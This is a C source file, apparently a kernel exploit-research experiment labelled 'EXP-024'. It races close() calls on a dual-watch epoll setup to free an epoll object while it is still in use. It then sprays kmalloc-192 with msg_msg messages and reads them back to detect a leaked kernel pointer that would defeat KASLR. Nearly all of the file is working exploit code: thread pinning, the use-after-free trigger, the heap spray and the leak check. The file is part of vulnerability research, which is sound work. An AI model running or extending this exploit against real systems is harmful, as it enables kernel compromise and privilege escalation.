#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <sys/syscall.h>

int ep_outer1, ep_outer2, ep_inner;
int pipefd[2];
int msgq_id;

struct msg_struct {
    long mtype;
    char mtext[144]; // 144 bytes user data -> kmalloc-192
};

volatile int state = 0;

void craft_spray_msg(struct msg_struct *msg) {
    memset(msg->mtext, 0x41, sizeof(msg->mtext));
    // msg_msg user data starts at slab offset 48
    // Slab offset 160 (ep->refs.first) = user data byte 112-119
    // Fill with a recognizable marker so we can detect overwrites
    *(uint64_t*)(msg->mtext + 112) = 0xAAAABBBBCCCCDDDDULL;
}

void print_hex(const char *label, const void *data, size_t len) {
    const uint8_t *p = (const uint8_t*)data;
    printf("%s:\n", label);
    for (size_t i = 0; i < len; i += 16) {
        printf("  %04zx: ", i);
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            printf("%02x ", p[i + j]);
        }
        printf("\n");
    }
}

void *thread_a(void *arg) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    printf("[Thread A] Starting close(ep_outer1)...\n");
    state = 1;
    close(ep_outer1);  // Close FIRST outer epoll
    printf("[Thread A] close(ep_outer1) returned.\n");
    return NULL;
}

void *thread_b(void *arg) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    while (state == 0) {
        // Spin until Thread A starts
    }
    // Wait for Thread A to be suspended by GDB
    usleep(200000); // 200ms
    
    printf("[Thread B] Starting close(ep_inner)...\n");
    close(ep_inner); // This triggers ep_clear_and_put -> ep_free of inner_epoll
    printf("[Thread B] close(ep_inner) returned.\n");
    
    // SPRAY immediately
    struct msg_struct msg;
    msg.mtype = 0x1337;
    craft_spray_msg(&msg);
    
    printf("[Thread B] Starting msgsnd spray...\n");
    int sent = 0;
    for (int i = 0; i < 5000; i++) {
        int ret = msgsnd(msgq_id, &msg, sizeof(msg.mtext), IPC_NOWAIT);
        if (ret < 0) {
            printf("[Thread B] msgsnd failed at %d: errno=%d\n", i, errno);
            break;
        }
        sent++;
    }
    printf("[Thread B] Spray complete. Sent %d messages.\n", sent);
    
    // Signal GDB via syscall
    syscall(147, 1337, 1337, 1337);
    return NULL;
}

int main() {
    printf("[*] EXP-024: Clean re-test of dual-watch KASLR leak claim\n");
    printf("[*] Testing: does hlist_del_rcu write a kernel pointer to FREED inner_epoll+160?\n");
    printf("[*] Dual-watch topology: inner_epoll added to TWO outer epolls\n\n");
    
    msgq_id = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msgq_id == -1) {
        perror("msgget");
        return 1;
    }
    printf("[*] msgq_id = %d\n", msgq_id);

    pipe(pipefd);
    printf("[*] pipe: %d, %d\n", pipefd[0], pipefd[1]);

    state = 0;
    ep_outer1 = epoll_create1(0);
    ep_outer2 = epoll_create1(0);
    ep_inner = epoll_create1(0);
    printf("[*] ep_outer1=%d, ep_outer2=%d, ep_inner=%d\n", ep_outer1, ep_outer2, ep_inner);
    
    struct epoll_event ev;
    ev.events = EPOLLIN;
    
    // Add pipe to inner
    ev.data.fd = pipefd[0];
    if (epoll_ctl(ep_inner, EPOLL_CTL_ADD, pipefd[0], &ev) < 0) {
        perror("epoll_ctl add pipe to inner");
        return 1;
    }
    printf("[*] Added pipe to inner epoll\n");
    
    // Add inner to outer1
    ev.data.fd = ep_inner;
    if (epoll_ctl(ep_outer1, EPOLL_CTL_ADD, ep_inner, &ev) < 0) {
        perror("epoll_ctl add inner to outer1");
        return 1;
    }
    printf("[*] Added inner to outer1 -> epi1 in inner->refs\n");
    
    // Add inner to outer2
    if (epoll_ctl(ep_outer2, EPOLL_CTL_ADD, ep_inner, &ev) < 0) {
        perror("epoll_ctl add inner to outer2");
        return 1;
    }
    printf("[*] Added inner to outer2 -> epi2 in inner->refs (dual-watch)\n");
    
    pthread_t ta, tb;
    pthread_create(&ta, NULL, thread_a, NULL);
    pthread_create(&tb, NULL, thread_b, NULL);
    
    pthread_join(ta, NULL);
    printf("[*] Thread A joined\n");
    pthread_join(tb, NULL);
    printf("[*] Thread B joined\n");
    
    // Read back a message to check for any kernel pointer leak
    printf("\n[*] Reading back sprayed messages via msgrcv...\n");
    struct msg_struct sent_msg;
    sent_msg.mtype = 0x1337;
    craft_spray_msg(&sent_msg);
    
    int leak_found = 0;
    for (int msg_idx = 0; msg_idx < 10; msg_idx++) {
        struct msg_struct recv_msg;
        ssize_t recv_len = msgrcv(msgq_id, &recv_msg, sizeof(recv_msg.mtext), 0x1337, IPC_NOWAIT);
        if (recv_len < 0) {
            if (errno == ENOMSG) {
                printf("[*] No more messages after %d reads\n", msg_idx);
                break;
            }
            perror("msgrcv failed");
            break;
        }
        
        // Check for differences from what we sent
        int differs = 0;
        for (int i = 0; i < 144; i += 8) {
            uint64_t s = *(uint64_t*)(sent_msg.mtext + i);
            uint64_t r = *(uint64_t*)(recv_msg.mtext + i);
            if (s != r) {
                differs = 1;
                printf("[MSG %d] Byte %3d-%3d (slab offset %3d): sent=0x%016lx recv=0x%016lx",
                       msg_idx, i, i+7, i+48, s, r);
                if ((r & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
                    printf("  *** KERNEL POINTER! ***");
                    leak_found = 1;
                }
                printf("\n");
            }
        }
        if (!differs && msg_idx == 0) {
            printf("[MSG %d] Identical to sent message (no corruption detected)\n", msg_idx);
        }
    }
    
    if (leak_found) {
        printf("\n[RESULT] KERNEL POINTER LEAK DETECTED IN USERSPACE!\n");
    } else {
        printf("\n[RESULT] NO kernel pointer leak detected. Sent == Received.\n");
    }
    
    // Cleanup
    msgctl(msgq_id, IPC_RMID, NULL);
    close(ep_outer2);
    close(pipefd[0]);
    close(pipefd[1]);
    
    printf("[*] Done.\n");
    return 0;
}
